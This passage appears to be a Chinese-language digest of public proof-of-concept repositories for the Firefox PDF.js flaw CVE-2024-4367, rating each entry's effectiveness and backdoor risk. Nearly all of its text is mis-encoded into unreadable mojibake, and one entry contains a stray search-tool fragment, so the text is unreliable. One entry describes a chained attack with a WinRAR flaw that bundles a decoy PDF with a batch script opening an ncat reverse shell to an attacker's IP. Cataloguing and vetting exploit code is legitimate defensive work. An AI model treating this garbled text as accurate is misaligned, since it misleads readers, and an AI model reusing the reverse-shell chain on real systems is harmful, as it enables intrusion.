æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
